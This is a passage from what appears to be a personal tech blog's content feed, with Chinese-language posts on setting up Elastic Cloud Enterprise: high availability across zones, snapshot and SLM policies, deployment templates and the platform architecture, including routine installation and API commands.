-u admin:&lt;PASSWORD&gt; https://localhost:12443/api/v1/platform/configuration/security/enrollment-tokens -d &#39;&#123; &quot;persistent&quot;: false, &quot;roles&quot;: [&quot;allocator&quot;, &quot;coordinator&quot;, &quot;director&quot;, &quot;proxy&quot;] &#125;&#39;</code></p><p>用剛剛產生的 token 安裝第三台: <code>bash &lt;(curl -fsSL https://download.elastic.co/cloud/elastic-cloud-enterprise.sh) install --cloud-enterprise-version 2.1.1 --availability-zone myzone3 --roles &quot;allocator,coordinator,director,proxy&quot; --coordinator-host &lt;IP&gt; --roles-token &lt;TOKEN&gt;</code></p><blockquote><p>產生成功<br><img src="/2020/09/27/elastic-cloud-high-availability/HAZoneThree.JPG" alt="HAZoneThree"></p></blockquote><h4 id="建立-Depeloyments"><a href="#建立-Depeloyments" class="headerlink" title="建立 Depeloyments"></a>建立 Depeloyments</h4><p>配置完可用區域後，就可以建立一個 Depeloyments，選擇 2 zones 測試。</p><blockquote><p>建立一個 Depeloyments<br><img src="/2020/09/27/elastic-cloud-high-availability/HACreateDeployment.JPG" alt="HACreateDeployment"></p></blockquote><p>建立成功後會發現另外一個 zone 多出一個 Tiebreakers、<a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/modules-node.html#master-node">Master-eligible</a> 的標籤，所以可以看出 Production 環境最少就是需要三個可用區域，選了 2 zones 的時候會自動把第三個設定成 tiebreaker，決勝局 (Tiebreakers) 的機制在 ECE 中是用來避免分散式架構中的 split brain，腦裂 (split brain) 是指在 HA 的系統架構中，兩個節點的溝通中斷時，本來對外是一個整體的節點分裂成兩個，並且開始搶奪共享的資源，導致系統產生錯誤或是效能下降。</p><p>一個整體的節點通常只會有一個 Master Node 主導，其他節點配合，所以需要透過配置 (n&#x2F;2) + 1 以上的節點來確保法定票數 (quorum) 還有一個第三方仲裁者 (Tiebreakers)，當 Master Node 故障出現分裂問題時，就可以透過投票的機制選出新的 Master Node 去取代，Master node 主要是負責新增建立索引、確認節點歸屬的 cluster、決定部屬新節點的位置，Master-eligible 標籤則代表不只有投票功能，也有可能會變成新的 master node。</p><blockquote><p>決勝局 (Tiebreakers)<br><img src="/2020/09/27/elastic-cloud-high-availability/HATiebreaker.JPG" alt="HATiebreaker"></p></blockquote><h2 id="結論與建議"><a href="#結論與建議" class="headerlink" title="結論與建議"></a>結論與建議</h2><p>安裝教學文件</p><ul><li>小: <a href="https://www.elastic.co/guide/en/cloud-enterprise/current/ece-topology-example1.html">https://www.elastic.co/guide/en/cloud-enterprise/current/ece-topology-example1.html</a></li><li>中: <a href="https://www.elastic.co/guide/en/cloud-enterprise/current/ece-topology-example2.html">https://www.elastic.co/guide/en/cloud-enterprise/current/ece-topology-example2.html</a></li><li>大: <a href="https://www.elastic.co/guide/en/cloud-enterprise/current/ece-topology-example3.html">https://www.elastic.co/guide/en/cloud-enterprise/current/ece-topology-example3.html</a></li></ul><p>官方的相關建議</p><ul><li>每個可用區域中至少要有一個 Runner 有 director、coordinator roles</li><li>每個可用區域中，可以有多個 Runners，確認各區域加起來有足夠的 allocator role 即可</li><li>如果 clusters 夠多，可以讓 Master Nodes 不需要去處理檢索或是儲存建立索引的工作</li><li>一台實體機只能容納一個可用區域，避免一台時體機壞了就讓系統停機</li><li>狀況允許的話，特殊角色可以分別設置在獨立的 Runners，減少未來擴充時的問題</li><li>至少每個可用區域都要有一個甚至多個 Runners 要有 Proxy Role</li></ul>]]></content>
      
      
      <categories>
          
          <category> ElasticCloud </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ElasticCloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Elastic Cloud Snapshots</title>
      <link href="/2020/09/25/elastic-cloud-snapshots/"/>
      <url>/2020/09/25/elastic-cloud-snapshots/</url>
      
        <content type="html"><![CDATA[<p>還在把資料備份到謎之 D 槽嗎? 現在都什麼時候了? 2020 年，這篇文章將提到怎麼利用現代科技進行資料的備份與恢復，Elastic 提供的快照功能，搭配對應的 <a href="https://www.elastic.co/guide/en/elasticsearch/plugins/7.9/repository.html">plugins</a> 能將資料備份到不同的雲端儲存服務。</p><h2 id="Elastic-Cloud-Snapshots"><a href="#Elastic-Cloud-Snapshots" class="headerlink" title="Elastic Cloud Snapshots"></a>Elastic Cloud Snapshots</h2><p>為什麼備份跟快照很重要?</p><ul><li>快照可以在不影響系統運行的狀況下做快速且低成本的備份</li><li>遇到病毒感染或錯誤可以用最快的速度恢復系統運行，通常做快照跟備份的位置會是不同的機台與服務，所以當主要的虛擬機被打掛了，快照跟備份還會活得好好的</li></ul><blockquote><p>Elastic Snapshots 可以做什麼?<br><img src="/2020/09/25/elastic-cloud-snapshots/SnapshotsQA.JPG" alt="SnapshotsQA"></p></blockquote><p>在啟用 Elastic Cloud 服務後，會預設幫我們啟動快照的功能，快照預設自動每 30 分鐘做一次且會透過 Repositories 進行存放。</p><p>Repositories 可以是本機或是任何遠端有提供支援 <a href="https://www.elastic.co/guide/en/elasticsearch/plugins/7.9/repository.html">plugins</a> 的雲端服務像是 Amazon S3、HDFS、Microsoft Azure、Google Cloud Storage 等等，目前 7.6 版以上就可以透過 kibana 的 GUI 進行快照跟恢復的動作了，可以說是非常方便。</p><h3 id="建立快照與恢復"><a href="#建立快照與恢復" class="headerlink" title="建立快照與恢復"></a>建立快照與恢復</h3><p>首先第一個步驟就是要註冊 Repository，<code>Stack Management &gt; Data &gt; Snapshot and Restore</code> 點選 Repositories 的 Tab 就可以進行建立，當然也可以透過 API 的方式進行，這個部分可以<a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/snapshots-register-repository.html">參考相關文件</a>，目前 Elastic Cloud 試用帳號只支援 AWS S3 跟 GCP，這個帳號目前是建立在 GCP 上。</p><ol><li><strong>建立 Repository</strong></li></ol><blockquote><p>Kibana 的介面中<br><img src="/2020/09/25/elastic-cloud-snapshots/SnapshotKibanaRepository.JPG" alt="SnapshotKibanaRepository"></p></blockquote><blockquote><p>也有提供支援 S3，要使用其他平台應該就要裝額外的 plug-in，這個部分目前沒有去嘗試<br><img src="/2020/09/25/elastic-cloud-snapshots/SnapshotRepoS3.JPG" alt="SnapshotRepoS3"></p></blockquote><blockquote><p>Elastic Cloud Enterprise 的介面也是類似<br><img src="/2020/09/25/elastic-cloud-snapshots/PlatformRepository.JPG" alt="PlatformRepository"></p></blockquote><ol start="2"><li><strong>建立快照並設定相關週期，透過 GUI 其實蠻方便的，就是下一步下一步。</strong></li></ol><blockquote><p>建立的過程中可以設定像是要多久快照一次快照保存多久<br><img src="/2020/09/25/elastic-cloud-snapshots/SnapshotRetention.JPG" alt="SnapshotRetention"></p></blockquote><blockquote><p>設定完成後也可以在 Policy 的 Tab 進行管理<br><img src="/2020/09/25/elastic-cloud-snapshots/SnapshotPolicy.JPG" alt="SnapshotPolicy"></p></blockquote><blockquote><p>Snapshots 可以看到系統自動製作的快照列表<br><img src="/2020/09/25/elastic-cloud-snapshots/SnapshotKibanaSnapshots.JPG" alt="SnapshotKibanaSnapshots"></p></blockquote><ol start="3"><li><strong>從快照恢復資料</strong>，從快照恢復也很方便就是點選然後按恢復就完成，也同樣能<a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/snapshots-restore-snapshot.html">透過 API 進行操作</a>。</li></ol><blockquote><p>從快照恢復資料<br><img src="/2020/09/25/elastic-cloud-snapshots/SnapshotRepoRestore.JPG" alt="SnapshotRepoRestore"></p></blockquote><h3 id="SLM-snapshot-lifecycle-management"><a href="#SLM-snapshot-lifecycle-management" class="headerlink" title="SLM (snapshot lifecycle management)"></a>SLM (snapshot lifecycle management)</h3><p>這篇文章示範的 UI 背後其實是一套叫做 SLM (snapshot lifecycle management) 的管理機制，會自動依照設定的 SLM policy 做備份跟老舊快照的移除，也提供相關 API 提供管理，更詳細的資訊可以參考<a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/getting-started-snapshot-lifecycle-management.html">SLM 相關文件</a>，底下附上 API 的範例，看完之後建議直接使用 Kibana 的介面，畢竟 Kibana 已經做好 API 的串接。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">curl -X PUT &quot;localhost:9200/_slm/policy/nightly-snapshots?pretty&quot; -H &#x27;Content-Type: application/json&#x27; -d&#x27;</span><br><span class="line">&#123;</span><br><span class="line">  &quot;schedule&quot;: &quot;0 30 1 * * ?&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;&lt;nightly-snap-&#123;now/d&#125;&gt;&quot;,</span><br><span class="line">  &quot;repository&quot;: &quot;my_repository&quot;,</span><br><span class="line">  &quot;config&quot;: &#123;</span><br><span class="line">    &quot;indices&quot;: [&quot;*&quot;]</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;retention&quot;: &#123;</span><br><span class="line">    &quot;expire_after&quot;: &quot;30d&quot;,</span><br><span class="line">    &quot;min_count&quot;: 5,</span><br><span class="line">    &quot;max_count&quot;: 50</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ElasticCloud </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ElasticCloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Elastic Cloud Enterprise Deployment</title>
      <link href="/2020/09/24/elastic-cloud-enterprise-deployments/"/>
      <url>/2020/09/24/elastic-cloud-enterprise-deployments/</url>
      
        <content type="html"><![CDATA[<h2 id="Elastic-Cloud-Enterprise-Deployment"><a href="#Elastic-Cloud-Enterprise-Deployment" class="headerlink" title="Elastic Cloud Enterprise Deployment"></a>Elastic Cloud Enterprise Deployment</h2><p>介紹大家第一次安裝使用 ECE (Elastic Cloud Enterprise) 及開箱管理主控台介面 (Cloud UI) 和部屬樣板 (Deployment Templates) 的體驗心得。</p><p>Elastic Cloud Enterprise: 需要憑證，但第一次安裝會給 30 天的試用</p><ul><li>使用統一的介面規範、管理、監控不同架構下的 Elasticsearch 和 Kibana</li><li>可以選擇部屬在實體機、虛擬機、私有雲、公有雲皆可</li><li>能夠輕鬆設定結點的擴展 (scalability)、安全性 (security)、升級 (upgrades)、備份與快照 (backups)</li></ul><p>操作 ECE 有三種方式</p><ul><li>GUI</li><li>直接下指令，指令可以安裝也可以升級和維護配置</li><li>透過 API</li></ul><p>硬體規格建議，Production 機台至少 8G 記憶體，升級規格後就不能降級，所以要注意</p><ul><li>預設每個 clusters RAM:storage 是 1:32，所以 1G 最少要配 32G 的硬碟</li><li>搜尋服務: SSD + RAM:storage 1:16 ~ 1:8</li><li>儲存服務: HD + RAM:storage 1:48 ~ 1:96</li></ul><h3 id="安裝-ECE"><a href="#安裝-ECE" class="headerlink" title="安裝 ECE"></a>安裝 ECE</h3><p>安裝前會有很多 Linux 指令會需要輸入並編輯很多設定檔，大多是在設置環境和權限就不逐一贅述。</p><blockquote><p>大概有 30 個步驟左右<br><img src="/2020/09/24/elastic-cloud-enterprise-deployments/InstallECE.png" alt="InstallECE"></p></blockquote><p>安裝完成後記得重開機，然後確認一下權限</p><blockquote><p>該掛的都有掛上去，也確認都有 Root 了<br><img src="/2020/09/24/elastic-cloud-enterprise-deployments/InstallCheckSetting.JPG" alt="InstallCheckSetting"></p></blockquote><p>就可以下一鍵安裝指令，安裝完記得備份一下輸出的訊息，因為包含帳號密碼，還有相關的 token</p><blockquote><p>成功訊息中包含很多敏感資料<br><img src="/2020/09/24/elastic-cloud-enterprise-deployments/InstallSuccess.png" alt="InstallSuccess"></p></blockquote><h3 id="ECE-Deployments"><a href="#ECE-Deployments" class="headerlink" title="ECE Deployments"></a>ECE Deployments</h3><p>ECE 底層幾乎跟 Elasticsearch 是相同的，原則上可以用相同方法邏輯去管理所有的 Elastic Stack 服務。</p><p>安裝部屬完成後就可以用瀏覽器進到網頁版的管理主控台介面 (Cloud UI)，管理主控台 (Cloud UI) 提供了網頁版的管理介面，能夠管理、安裝及監控 ECE 的元件，Cloud UI 主要會分成三大塊</p><ul><li>Deployments: 顯示所有已部屬的元件服務列表，顯示相關規格與健康度</li><li>Platform: ECE 本身相關管理</li><li>Activity Feed: 所有部屬的元件服務最近活動的時間</li></ul><p>操作說明與步驟大致如下，首先可以先練習建立一個部屬，並進入 Cluster 查看 Elasticsearch 相關的詳細資料</p><blockquote><p>建立一個新的部屬<br><img src="/2020/09/24/elastic-cloud-enterprise-deployments/DeploymentCloudUI.png" alt="DeploymentCloudUI"></p></blockquote><blockquote><p>建立的時候有預設的 Templete，也可以自訂配置記憶體大小、ES 版本<br><img src="/2020/09/24/elastic-cloud-enterprise-deployments/DeploymentCreate.JPG" alt="DeploymentCreate"></p></blockquote><blockquote><p>建立完成後會有個密碼記得存好，Activity 會顯示目前節點上的活動<br><img src="/2020/09/24/elastic-cloud-enterprise-deployments/DeploymentActivity.JPG" alt="DeploymentActivity"></p></blockquote><blockquote><p>完成後可以開啟 ES 的監控，這樣就可以在 kibana 上監控服務狀況<br><img src="/2020/09/24/elastic-cloud-enterprise-deployments/DeploymentElasticsearch.JPG" alt="DeploymentElasticsearch"></p></blockquote><blockquote><p>建立的時候選錯了也可以透過編輯修改相關配置<br><img src="/2020/09/24/elastic-cloud-enterprise-deployments/DeploymentEdit.JPG" alt="DeploymentEdit"></p></blockquote><blockquote><p>在設定好 Repository 後，才能夠啟用快照功能，目前看起來只支援 S3<br><img src="/2020/09/24/elastic-cloud-enterprise-deployments/DeploymentSnapshots.JPG" alt="DeploymentSnapshots"></p></blockquote><blockquote><p>找不到怎麼設定 ES 也提供 API 可以下指令處理<br><img src="/2020/09/24/elastic-cloud-enterprise-deployments/DeploymentAPIConsole.JPG" alt="DeploymentAPIConsole"></p></blockquote><p>監控與其他相關設定:</p><ul><li>Kibana: 基本相關訊息，可以在這裡開啟介面跟重啟</li><li>Activity: 顯示最近活動</li><li>Security: 安全性相關設定</li><li>Operations: 其他設定與操作</li></ul><blockquote><p>可以到 Kibana 的介面查看，剛剛建立配置的時候會有個密碼就是在 kibana 使用，忘記的話也沒關係<br><img src="/2020/09/24/elastic-cloud-enterprise-deployments/DeploymentKibana.JPG" alt="DeploymentKibana"></p></blockquote><blockquote><p>開啟 ES 監控後的介面<br><img src="/2020/09/24/elastic-cloud-enterprise-deployments/ECEKibana.JPG" alt="ECEKibana"></p></blockquote><blockquote><p>Security 安全相關設定，忘記密碼也可以在這裡重設<br><img src="/2020/09/24/elastic-cloud-enterprise-deployments/DeploymentSecurity.JPG" alt="DeploymentSecurity"></p></blockquote><blockquote><p>Operations 提供其他相關的操作<br><img src="/2020/09/24/elastic-cloud-enterprise-deployments/DeploymentOperations.JPG" alt="DeploymentOperations"></p></blockquote><h3 id="Deployment-Templates"><a href="#Deployment-Templates" class="headerlink" title="Deployment Templates"></a>Deployment Templates</h3><p>接下來會介紹如何建立 Elastic Cloud Enterprise 的部屬樣版，在未來系統效能不夠時，能夠方便且快速的做擴充。當建立一個部屬的時候，會需要設定部屬中包含哪些 Elastic Stack 中的服務和相關的硬體規格，Elastic Cloud Enterprise 提供了預先為了搜尋還有一般用途使用的的 Deployment 樣板方便大家直接使用，</p><p>建立一個樣板的步驟如下</p><ul><li>在 Allocators 加上 Tags: 這樣未來機台變多時，才會知道這裡給了哪種規格的硬體配置</li><li>Instance Configurations: 運用 Tag 新增配置，譬如篩選出配置 SSD + I7 的所有資源</li><li>用設定好的 Instance 配置去建立一個 Deployment 樣版</li></ul><h3 id="Tagging-Allocators"><a href="#Tagging-Allocators" class="headerlink" title="Tagging Allocators"></a>Tagging Allocators</h3><p>在安裝完 ECE 之後，可以先幫現有的 Allocators 進行標記，標記的目的是為了在建立 instance configurations 和 deployment templates 可以進行辨識與篩選指定，未來在新加入的時候也要記得加上相關 Tags，在命名跟描述上要盡量避免用特殊案例也盡量避免用 Elastic Stack 元件去命名。</p><p>Tag 會由 key 和 value 組成，底下列出簡單的分類和命名範例:</p><ul><li>CPU: <code>highCPU: true</code></li><li>Memory: <code>highMemory: true</code></li><li>Storage: <code>highstorage: true</code></li><li>I&#x2F;O: <code>SSD: true</code></li></ul><p>加入的方式首先到 Platform &gt; Allocators 的管理介面，點選想要加入的機器進行配置，預設會是沒有任何 Tag 的，加入相關 Tag 後就可以在列表上看到。</p><blockquote><p>新增 Tag 很簡單就是輸入 key, value 相關資訊按加入<br><img src="/2020/09/24/elastic-cloud-enterprise-deployments/AddTags.JPG" alt="AddTags"></p></blockquote><blockquote><p>加入相關 Tag 後就可以在列表上看到<br><img src="/2020/09/24/elastic-cloud-enterprise-deployments/Tags.JPG" alt="Tags"></p></blockquote><h3 id="Instance-Configurations-新增配置"><a href="#Instance-Configurations-新增配置" class="headerlink" title="Instance Configurations 新增配置"></a>Instance Configurations 新增配置</h3><p>首先到 Platform &gt; Templete &gt; Instance Configurations 的 Tab 可以看到目前已經有的配置列表，在建立的時候就會用到之前設定過的 Tag 來當作條件去篩選並指定需要的硬體狀況。</p><blockquote><p>配置列表<br><img src="/2020/09/24/elastic-cloud-enterprise-deployments/InstanceConfigurationsList.JPG" alt="InstanceConfigurationsList"></p></blockquote><blockquote><p>用 Tag 來當作條件去篩選並指定需要的硬體狀況<br><img src="/2020/09/24/elastic-cloud-enterprise-deployments/InstanceConfigurations.JPG" alt="InstanceConfigurations"></p></blockquote><h3 id="Deployment-樣版建立"><a href="#Deployment-樣版建立" class="headerlink" title="Deployment 樣版建立"></a>Deployment 樣版建立</h3><p>接著就可以到 Platform &gt; Templete &gt; Deployment Templete 的 Tab 開始建立，建立的時候選擇需要啟動的 Elastic Stack 元件，然後就可以選擇需要的 Instance Configurations 前一個步驟設定好的配置就可以在這個時候使用。</p><blockquote><p>樣板列表<br><img src="/2020/09/24/elastic-cloud-enterprise-deployments/Templates.JPG" alt="Templates"></p></blockquote><blockquote><p>選擇需要的 Instance Configurations<br><img src="/2020/09/24/elastic-cloud-enterprise-deployments/CreateDeploymentTemplate.JPG" alt="CreateDeploymentTemplate"></p></blockquote><blockquote><p>選擇需要的 Elastic Stack 元件並配置硬體規格<br><img src="/2020/09/24/elastic-cloud-enterprise-deployments/EditTemplete.JPG" alt="EditTemplete"></p></blockquote><h3 id="Hot-Warm-Template"><a href="#Hot-Warm-Template" class="headerlink" title="Hot Warm Template"></a>Hot Warm Template</h3><p>在預設的樣板列表中可以看到一個比較特別的 hot-warm template，用途就是用來儲存和分析 time-series 的資料，hot-warm 這樣的結構提供分析和儲存的部屬情境。</p><p>讓我們幫大家複習一下 Log 在 Elastic Stack 中的生命週期，這個樣板就是為了這樣的生命週期出現的。</p><ul><li>資料的產生</li><li>Filebeat 傳送</li><li>處理與儲存<ul><li>Hot Data: 常讀寫</li><li>Warm Data: read-only 少用</li></ul></li><li>搜尋與分析</li><li>封存資料成 Warm Data</li><li>Purge 清除不在使用的資料</li></ul><blockquote><p>樣板列表中的第二個<br><img src="/2020/09/24/elastic-cloud-enterprise-deployments/Templates.JPG" alt="Templates"></p></blockquote><p>hot-warm 的結構至少會需要兩種 Node，至少一個 Elasticsearch Hot Node 用來檢索最近的資料，還有一個 Warm node 用來存取 read-only 的索引或是比較少檢索的資料。</p><ul><li>Hot Data Node: 處理常被檢索的索引及負責處理新進資料，所以硬體配置會需要處理較大量的 I&#x2F;O 通常會建議配置 SSD</li><li>Warm Data Node: 處理大量只會 read-only 的且較少被檢索的索引，因為會用到大量空間，可以用一般硬碟較省成本</li></ul><h2 id="心得與結論"><a href="#心得與結論" class="headerlink" title="心得與結論"></a>心得與結論</h2><p>ECE 的好處是看起來介面比較簡單過場動畫也做得比較好，不管是控制台、監控儀錶板都已經設計好且開箱即用，算是一個蠻方便且完整的服務，雖然教學文件看起來很長，但 UI 打開來點一點大概就知道功能怎麼使用，唯一複雜的大概就是 Linux 安裝前的相關配置，操作的時候建議還是要知道操作了什麼開了什麼權限。</p><p>使用開箱即用的服務其實是好的，舉例來說以前也曾經透過 PostGIS 去檢索 PostgreSQL 裡面的地理資訊，開發速度跟寫法效能就需要依賴工程師的實力，畢竟也是需要了解 PostGIS 然後維護一個後端服務。</p><p>後來透過架設 Solr 發現全文檢索也已經支援經緯度甚至範圍搜尋的功能，所以如果沒有需要用到像是 KNN 這種高級運算，只要架好全文檢索服務就可以直接使用 API 參數進行相關操作，效能會有一定程度的保證也不需要開發及維護後端的程式碼。</p>]]></content>
      
      
      <categories>
          
          <category> ElasticCloud </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ElasticCloud </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Elastic Cloud Enterprise Architecture</title>
      <link href="/2020/09/23/elastic-cloud-enterprise-architecture/"/>
      <url>/2020/09/23/elastic-cloud-enterprise-architecture/</url>
      
        <content type="html"><![CDATA[<h2 id="Elastic-Cloud-Enterprise-Architecture"><a href="#Elastic-Cloud-Enterprise-Architecture" class="headerlink" title="Elastic Cloud Enterprise Architecture"></a>Elastic Cloud Enterprise Architecture</h2><p>這篇文章會分享第一次看到 Elastic Cloud Enterprise 架構的心得及如何透過 ECE 主控台介面 (Cloud UI) 做平台管理及架構設定。</p><p>Elastic Cloud Enterprise 是 Elastic Stack 雲端企業用的版本，提供了較完整的服務導向系統架構，還有<a href="https://www.elastic.co/guide/en/cloud-enterprise/current/ece-playbook.html">完整的配置建議教學</a>，減少了較沒經驗的工程師在增修了系統配置後反而更加不穩定的問題。</p><p>為什麼使用 Elastic Cloud Enterprise 而不自己管理?</p><ul><li>減少部屬跟管理硬體架構的成本，像是管理網路、防火牆、硬碟狀況等等</li><li>用 docker 最大化硬體機台的使用率，隔離資源避免 Split Brains 這類問題</li><li>提供安全性、HA 的保證，減少因為一個服務沒處理好就整台機器掛掉的風險</li><li>能夠集中管理散布在各地的服務</li></ul><p>ECE Features</p><ul><li>服務都以 docker 容器的方式提供</li><li>透過多個 Availability Zones 做到 HA</li><li>透過 <a href="http://zookeeper.apache.org/">ZooKeeper</a> 管理協調節點部屬的狀態</li><li>透過 API 或是網頁版 GUI 可以很方便的操作管理</li><li>支援離線安裝</li><li>系統還原或是快照功能</li></ul><h3 id="Roles-and-Runners"><a href="#Roles-and-Runners" class="headerlink" title="Roles and Runners"></a>Roles and Runners</h3><p>每台機器上會有一個 Runners 負責控管每一台機器，確保所有的容器都是正常健康運作的，Runner 會被給予多個角色，每個角色則會對應到不同的容器，有不同的權限及用途。</p><ul><li>Proxy Role，處理使用者請求，確保相關靜態資源的可存取狀態，協助不停機升級或擴充</li><li>Allocator Role，負責把所有節點上的服務跑起來，負責產生新的容器並啟動節點</li><li>Coordinator Role，負責 constructor，協調系統資源與排程</li><li>Director Role，管理 ZooKeeper，只要被 assign 那台機器上面就會跑 Zookeeper 的服務，且服務不會因為角色移除而消失</li></ul><h3 id="ECE-Platforms-系統架構"><a href="#ECE-Platforms-系統架構" class="headerlink" title="ECE Platforms 系統架構"></a>ECE Platforms 系統架構</h3><p>系統架構圖如下，可以看到每台機器上都會有一個 Runner，每個服務都會部屬在各自的 docker container 裡，幾個主要區塊如下</p><ul><li>Load balancers: 附載平衡負責導流</li><li>Proxies: 監控每個 availability zones 是否健康，通常會在附載平衡後面接好幾個確保 Proxy 穩定</li><li>Allocators: 管理節點上的站台服務，每個節點上服務的 CRUD</li><li>Control Plane: 負責管理整個架構的核心<ul><li>ZooKeeper，分散式系統中確保文件寫入一致性，用來存放 ECE 元件部屬狀態與所需的配置資訊維護像是 Proxy 的 Routing Table，會透過 STunnel 跟 ECE 元件們傳遞訊息溝通。</li><li>Director: 管理 ZooKeeper</li><li>Constructor: 排程與監控，當有相關狀態改變就要即時寫入 ZooKeeper，也負責分配節點到不同的 availability zones 確保服務可用性</li><li>Cloud UI and API: API 相關管理</li></ul></li></ul><blockquote><p>系統架構圖<br><img src="https://www.elastic.co/guide/en/cloud-enterprise/current/images/ece-architecture.png" alt="ece-architecture"></p></blockquote><p>介紹了 Elastic Cloud Enterprise 的架構後，接下來會介紹透過 ECE 主控台介面 (Cloud UI) 做平台管理及設定，下一篇文章會介紹較進階的<a href="https://linyencheng.github.io/2020/09/24/elastic-cloud-enterprise-deployments/">部屬樣板使用方式</a>。Cloud UI 中的 Platforms 主要顯示與管理系統架構中各節點的健康狀況。一套完整的架構除了 Load Balancers 都能夠在 Platforms 中進行健康狀況的監控與配置，包含了以下相關選單</p><ul><li>Allocators</li><li>Runners</li><li>Proxies</li><li>Elastic Stack</li><li>Templates</li><li>Repository</li><li>Setting</li><li>Security</li></ul><h4 id="Platforms-Allocators"><a href="#Platforms-Allocators" class="headerlink" title="Platforms Allocators"></a>Platforms Allocators</h4><p>移動節點的功能，當我們發現某個 Cluster 中的健康狀況出問題或機器正在升級維護時，就能夠透過這個功能先把節點移動到其他的 Cluster 中來減少停機的時間。</p><blockquote><p>移動或刪除 Allocators<br><img src="/2020/09/23/elastic-cloud-enterprise-architecture/PlatformAllocators.JPG" alt="PlatformAllocators"></p></blockquote><h4 id="Platforms-Runners"><a href="#Platforms-Runners" class="headerlink" title="Platforms Runners"></a>Platforms Runners</h4><p>Runners 是每台機器管理者，會管理多種角色，角色則會對應管理不同的容器服務，確保所有對應到該角色的容器服務都是健康的。</p><ul><li>Proxy Role，處理使用者請求，確保相關靜態資源的可存取狀態，協助不停機升級或擴充</li><li>Allocator Role，負責把所有節點上的服務跑起來，負責產生新的容器並啟動節點</li><li>Coordinator Role，負責 constructor，協調系統資源與排程</li><li>Director Role，管理 ZooKeeper，只要被 assign 那台機器上面就會跑 Zookeeper 的服務，且服務不會因為角色移除而消失</li></ul><blockquote><p>管理每個 Runners 的角色<br><img src="/2020/09/23/elastic-cloud-enterprise-architecture/PlatformRunners.JPG" alt="PlatformRunners"></p></blockquote><h4 id="Platforms-Proxy"><a href="#Platforms-Proxy" class="headerlink" title="Platforms Proxy"></a>Platforms Proxy</h4><p>查看目前 Proxy 設定的狀況，這個部分還沒有開到多個 Availablity Zone 所以還沒深入研究。</p><blockquote><p>Proxy 狀態列表<br><img src="/2020/09/23/elastic-cloud-enterprise-architecture/PlatformProxy.JPG" alt="PlatformProxy"></p></blockquote><h4 id="Platforms-ElasticStack"><a href="#Platforms-ElasticStack" class="headerlink" title="Platforms ElasticStack"></a>Platforms ElasticStack</h4><p>這一頁蠻單純的，每個 Deployment 中的 Elastic Stack 版本與內容列表。</p><blockquote><p>Elastic Stack 版本與內容列表<br><img src="/2020/09/23/elastic-cloud-enterprise-architecture/PlatformElasticStack.JPG" alt="PlatformElasticStack"></p></blockquote><h4 id="Platforms-Templates"><a href="#Platforms-Templates" class="headerlink" title="Platforms Templates"></a>Platforms Templates</h4><p>提供部屬用的樣版，可以去設定每台機器是不是需要 highCPU 或是 SSD 等等的服務配置，像是儲存用的服務可能就不需要 SSD，記憶體與儲存空間的比例也可以設定到 1:48 ~ 1:96 等等相關配置。</p><blockquote><p>樣板管理介面<br><img src="/2020/09/23/elastic-cloud-enterprise-architecture/PlatformTemplates.JPG" alt="PlatformTemplates"></p></blockquote><h4 id="Platforms-Repository"><a href="#Platforms-Repository" class="headerlink" title="Platforms Repository"></a>Platforms Repository</h4><p>要啟用快照功能一定要先配置 Repository，詳細介紹可以參考<a href="https://linyencheng.github.io/2020/09/25/elastic-cloud-snapshots/">前一篇文章</a>。</p><blockquote><p>Repository 配置<br><img src="/2020/09/23/elastic-cloud-enterprise-architecture/PlatformRepository.JPG" alt="PlatformRepository"></p></blockquote><h4 id="Platforms-Security-And-Setting"><a href="#Platforms-Security-And-Setting" class="headerlink" title="Platforms Security And Setting"></a>Platforms Security And Setting</h4><p>Platforms 相關設定與主控台安全管理，比較重要的是 Endpoints IP 或網域記得要設定正確，然後相關的 TLS 憑證可以在這裡匯入，主控台安全可以透過鎖 IP 的方式進行控管，只讓相關人員能夠進到這個管理介面。</p><blockquote><p>Platforms 相關設定<br><img src="/2020/09/23/elastic-cloud-enterprise-architecture/PlatformSetting.JPG" alt="PlatformSetting"></p></blockquote><blockquote><p>IP 設定<br><img src="/2020/09/23/elastic-cloud-enterprise-architecture/PlatformSecurity.JPG" alt="PlatformSecurity"></p></blockquote><h3 id="Load-Balancers"><a href="#Load-Balancers" class="headerlink" title="Load Balancers"></a>Load Balancers</h3><p>值得注意的是 Load Balancers 沒有包含在 ECE 裡面，因為 ECE 的架構中是包含這樣的設計，所以還是建議自行安裝像是 Nginx 這樣的工具，相關基礎配置也可以參考這篇<a href="https://linyencheng.github.io/2019/07/13/tool-nginx/">介紹 nginx 的文章</a>，裝上去之後就可以直接解決 C10K 的問題，每個 Availablity Zone 都至少配兩個 Load Balancers 來做到 HA，HA 的詳細概念與實作會在下一篇文章跟大家分享。</p><h3 id="Activity"><a href="#Activity" class="headerlink" title="Activity"></a>Activity</h3><p>最後一個頁面其實是 Activity，可以看出是否有哪些節點已經閒置很久沒有使用，查看活動的狀態。</p><blockquote><p>結點活動狀態<br><img src="/2020/09/23/elastic-cloud-enterprise-architecture/Activity.JPG" alt="Activity"></p></blockquote><h2 id="心得與結論"><a href="#心得與結論" class="headerlink" title="心得與結論"></a>心得與結論</h2><p>過去的經驗有直接架過包含附載平衡的實體主機、用過 Azure App service 服務和虛擬機、Aws 開虛擬機搭配部分服務，底下分享一些使用過的優缺點跟心得。</p><ul><li>若買過 MS 